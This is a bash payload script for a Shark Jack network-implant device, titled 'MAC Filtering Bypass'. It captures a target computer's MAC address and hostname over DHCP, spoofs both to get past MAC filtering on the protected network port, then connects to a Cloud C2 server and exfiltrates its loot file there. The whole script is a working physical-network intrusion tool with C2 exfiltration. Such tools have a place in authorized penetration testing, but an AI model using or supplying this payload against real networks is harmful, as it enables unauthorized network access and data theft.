#!/bin/bash
#
# Title:        MAC Filtering Bypass
# Author:       TW-D
# Version:      1.0
# Category:     General
# Prerequisites:
# - Shark Jack Cable in Arming Mode
# - Serial USB Terminal (Android App)
# - Cloud C2 Server (/etc/device.config)
# Netmodes:     DHCP_SERVER then DHCP_CLIENT
#

readonly DEBUG_FILE="/root/loot/mac-filtering_bypass.txt"
readonly CC_ERROR="/tmp/cc-client-error.log"

set -u

SERIAL_WRITE "[SETUP] Plug the Shark Jack into the target computer's RJ45 port"
NETMODE DHCP_SERVER &> /dev/null
dhcp_leases=""
while [[ -z "${dhcp_leases}" ]]; do
    dhcp_leases="$(tail -n 1 /var/dhcp.leases 2> /dev/null)"
    sleep 2s
done
/bin/true > /var/dhcp.leases
echo "[SETUP] Content of the /var/dhcp.leases file before clearing :" > "${DEBUG_FILE}"
echo "${dhcp_leases}" >> "${DEBUG_FILE}"

read -r _ mac_address _ computer_name _ <<< "${dhcp_leases}"
if [[ -n "${mac_address}" && -n "${computer_name}" ]]; then
    SERIAL_WRITE "[STAGE1] The MAC address and the computer name for network impersonation have been retrieved"
    ip link set eth0 down
    ip link set eth0 address "${mac_address}"
    ip link set eth0 up
    echo "[STAGE1] Shark Jack MAC address has been changed to : ${mac_address}" >> "${DEBUG_FILE}"
    sysctl kernel.hostname="${computer_name}" &> /dev/null
    echo "[STAGE1] Shark Jack hostname has been changed to : ${computer_name}" >> "${DEBUG_FILE}"

    SERIAL_WRITE "[STAGE2] Unplug the Shark Jack from the target computer's RJ45 port"
    dmesg -c &> /dev/null
    while ! dmesg | grep -q 'rt3050-esw 10110000\.esw: link changed 0x00'; do
        sleep 2s
    done
    echo "[STAGE2] Shark Jack unplugged from the target computer's RJ45 port" >> "${DEBUG_FILE}"

    SERIAL_WRITE "[STAGE3] Plug the Shark Jack into the RJ45 port protected by MAC filtering that was connecting the target computer to the network (60s)"
    NETMODE DHCP_CLIENT &> /dev/null
    ip_address=""
    loop_control=30
    while [[ -z "${ip_address}" && "${loop_control}" -gt 0 ]]; do
        ip_address="$(ip addr show eth0 | awk '/inet / {print $2}' | cut -d'/' -f1)"
        loop_control="$((loop_control - 1))"
        sleep 2s
    done
    if [[ -n "${ip_address}" ]]; then
        SERIAL_WRITE "[STAGE3] An IP address has been assigned to the Shark Jack"
        echo "[STAGE3] Shark Jack has obtained the IP address : ${ip_address}" >> "${DEBUG_FILE}"
        if [[ -f "/etc/device.config" ]]; then
            SERIAL_WRITE "[STAGE4] The provisioning file is present, connection attempt (10s)"
            [[ -f "${CC_ERROR}" ]] && rm "${CC_ERROR}"
            C2CONNECT &> /dev/null
            sleep 10s
            if [[ ! -f "${CC_ERROR}" || ! -s "${CC_ERROR}" ]]; then
                SERIAL_WRITE "[STAGE4] The connection to the C2 Cloud is established"
                C2EXFIL STRING "${DEBUG_FILE}" "mac-filtering_bypass" &> /dev/null
            else
                SERIAL_WRITE "[FAIL4] The connection to the C2 Cloud is not established"
            fi
        else
            SERIAL_WRITE "[FAIL3] The provisioning file is missing"
        fi
    else
        SERIAL_WRITE "[FAIL2] No IP address has been assigned to the Shark Jack"
    fi
else
    SERIAL_WRITE "[FAIL1] The MAC address or the computer name for network impersonation has not been retrieved"
fi

SERIAL_WRITE "[CLEANUP] Flushing filesystem buffers to disk"

sync

SERIAL_WRITE "[FINISH] This payload is complete"
